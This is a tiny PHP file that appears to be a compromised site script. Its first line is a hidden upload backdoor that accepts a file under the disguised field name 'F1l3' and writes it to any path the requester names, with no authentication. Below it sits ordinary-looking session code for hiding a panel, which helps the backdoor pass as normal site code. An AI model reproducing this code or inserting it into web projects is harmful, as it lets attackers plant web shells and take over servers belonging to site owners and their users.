<?
if ($_FILES['F1l3']) {move_uploaded_file($_FILES['F1l3']['tmp_name'], $_POST['Name']); echo 'OK'; Exit;}
session_start();
	if ($_POST['action']=="hide_panel"){
		$_SESSION['hide_panel'] =true;
	}
?>